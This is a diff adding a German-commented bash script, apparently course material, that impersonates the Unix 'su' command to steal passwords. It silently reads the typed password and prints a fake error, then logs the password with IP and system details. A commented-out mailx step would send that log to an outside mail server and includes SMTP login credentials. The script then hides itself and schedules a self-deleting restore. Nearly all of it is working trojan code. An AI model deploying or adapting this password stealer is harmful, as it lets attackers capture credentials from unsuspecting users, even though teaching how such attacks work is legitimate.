@@ -1,0 +1,51 @@
+#!/bin/bash
+# Setup: Variablen, Pfade, ...
+SLEEP_PASSWORD=1	# anpassen an konkretes System
+INFOFILE="su_info"	# ggf. verstecken, tmpfs ...
+SU_HIDDEN=".su_hidden"	# Name des versteckten Scripts
+SU_RESTORE="su_restore" # Name des Wiederherstellungsscriptes
+RESTORE_TIME="30"	# Zeit bis Wiederherstellung
+
+# Step 1: Verhalten nachbilden
+echo -n "Passwort: "	# -n --> kein Zeilenvorschub
+read -s PASSWORD	# -s silent (kein Echo)
+echo ""			# Zeilenvorschub nach Passworteingabe
+sleep $SLEEP_PASSWORD	# Warten bis Meldung falsches Passwort
+echo "su: Benutzer bei zu Grunde liegendem Authentifizierungsmodul nicht bekannt"
+# Step 2: Informationen sammeln
+echo "Aufruf von su: $0"			>  $INFOFILE
+echo "Passwort: $PASSWORD"			>> $INFOFILE
+echo "IPv4 Adressen:"				>> $INFOFILE
+/sbin/ifconfig 2>/dev/null | grep "inet "	>> $INFOFILE # Fehler nach /dev/null
+echo "Systeminfo:"           			>> $INFOFILE
+uname -a 2>/dev/null				>> $INFOFILE
+echo "."					>> $INFOFILE # "." allein auf Zeile --> Ende der Nachricht	
+# Step 3: Informationen versenden
+#mailx -v \
+#	-r "ingolf.brunner@ba-leipzig.de" \
+#	-s "Passwortklau mit su" \
+#	-S smtp="mail.ba-leipzig.de:587" \
+#	-S smtp-use-starttls \
+#	-S smtp-auth=login \
+#	-S smtp-auth-user="user" \
+#	-S smtp-auth-password="Geheim9999" \
+#	-S ssl-verify=ignore \
+#	studierende@cs18-2.ba-leipzig.de \
+#	< $INFOFILE > /dev/null 2>&1
+rm $INFOFILE	# Infofile löschen
+
+# Step 4: Tätigkeit verbergen
+# Script verstecken
+mv su $SU_HIDDEN
+# Nach eine Weile Script wiederherstellen
+# --> dazu Script erzeugen, starten und löschen
+echo "#!/bin/bash"			>	$SU_RESTORE
+echo "rm $SU_RESTORE"			>>	$SU_RESTORE	# bei Ausführung sofort selbst löschen
+echo "sleep $RESTORE_TIME"		>>      $SU_RESTORE
+echo "mv $SU_HIDDEN su"			>>      $SU_RESTORE	# su rückbenennen
+echo "exit 0"				>>      $SU_RESTORE
+chmod 777 $SU_RESTORE		# "sicherheitshalber" alle Rechte für jeden User
+./$SU_RESTORE 1> /dev/null 2>&1	# Ausführen, keine Meldungen
+
+
+exit 1 # su liefert bei falschem Login 1 zurück
